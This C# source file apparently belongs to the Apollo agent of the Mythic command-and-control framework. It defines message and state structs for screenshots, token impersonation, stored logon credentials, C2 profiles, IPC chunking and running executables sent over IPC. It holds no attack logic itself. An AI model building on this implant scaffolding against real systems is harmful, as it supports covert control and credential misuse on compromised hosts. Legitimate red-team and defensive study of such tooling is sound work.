using ApolloInterop.Enums.ApolloEnums;
using ApolloInterop.Interfaces;
using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Net.Sockets;
using System.Runtime.Serialization;
using System.Security;

namespace ApolloInterop.Structs.ApolloStructs
{

    [DataContract]
    public struct ScreenshotInformation : IMythicMessage
    {
        [DataMember]
        public byte[] Data;

        public ScreenshotInformation(byte[] screenBytes)
        {
            Data = screenBytes;
        }

        public MessageType GetTypeCode()
        {
            return MessageType.ScreenshotInformation;
        }
    }

    public struct ApolloTokenInformation
    {
        public IntPtr Token;
        public bool IsPrimary;
        public bool IsImpersonatedImpersonation;
    }

    public struct ApplicationStartupInfo
    {
        public string Application;
        public string Arguments;
        public int ParentProcessId;
        public bool BlockDLLs;
    }

    public struct ApolloLogonInformation
    {
        public readonly string Username;
        public readonly string Password;
        public readonly SecureString SecurePassword;
        public readonly string Domain;
        public readonly bool NetOnly;

        public ApolloLogonInformation(string username, string password, string domain = ".", bool netOnly=false)
        {
            if (string.IsNullOrEmpty(username))
                throw new Exception("Username cannot be null or empty.");
            if (string.IsNullOrEmpty(password))
                throw new Exception("Password cannot be null or empty.");
            SecurePassword = new SecureString();
            foreach (char c in password)
                SecurePassword.AppendChar(c);
            SecurePassword.MakeReadOnly();
            Username = username;
            Password = password;
            Domain = domain;
            NetOnly = netOnly;
        }
    }

    public struct C2ProfileData
    {
        public Type TC2Profile;
        public Type TCryptography;
        public Type TSerializer;
        public Dictionary<string, string> Parameters;
    }

    [DataContract]
    public struct PeerMessage
    {
        [DataMember(Name = "message")]
        public string Message;
        [DataMember(Name = "type")]
        public MessageType Type;
    }

    [DataContract]
    public struct IPCChunkedData : IChunkMessage
    {
        [DataMember(Name = "message_type")]
        public MessageType Message;
        [DataMember(Name = "chunk_number")]
        public int ChunkNumber;
        [DataMember(Name = "total_chunks")]
        public int TotalChunks;
        [DataMember(Name = "id")]
        public string ID;
        [DataMember(Name = "data")]
        public string Data;

        public IPCChunkedData(string id="", MessageType mt = 0, int chunkNum = 0, int totalChunks = 1, byte[] data = null)
        {
            if (string.IsNullOrEmpty(id))
            {
                ID = Guid.NewGuid().ToString();
            }
            else
            {
                ID = id;
            }
            Message = mt;
            ChunkNumber = chunkNum;
            TotalChunks = totalChunks;
            Data = Convert.ToBase64String(data);
        }

        public int GetChunkNumber()
        {
            return this.ChunkNumber;
        }

        public int GetChunkSize()
        {
            return this.Data.Length;
        }

        public int GetTotalChunks()
        {
            return this.TotalChunks;
        }
    }

    [DataContract]
    public struct IPCCommandArguments : IMythicMessage
    {
        [DataMember(Name = "byte_data")]
        public byte[] ByteData;
        [DataMember(Name = "string_data")]
        public string StringData;

        public MessageType GetTypeCode()
        {
            return MessageType.IPCCommandArguments;
        }
    }

    [DataContract]
    public struct ExecutePEIPCMessage : IMythicMessage
    {
        [DataMember(Name = "executable")]
        public byte[] Executable;

        [DataMember(Name = "name")]
        public string ImageName;

        [DataMember(Name = "commandline")]
        public string CommandLine;

        public readonly MessageType GetTypeCode()
        {
            return MessageType.ExecutePEIPCMessage;
        }
    }


    [DataContract]
    public struct ProcessResponse
    {
        [DataMember(Name = "jobs")]
        public string[] Jobs;
        [DataMember(Name = "commands")]
        public string[] Commands;
    }

    public struct IPCData
    {
        public TcpClient Client;
        public NetworkStream NetworkStream;
        public PipeStream Pipe;
        public Object State;
        public Byte[] Data;
        public int DataLength;
    }
}
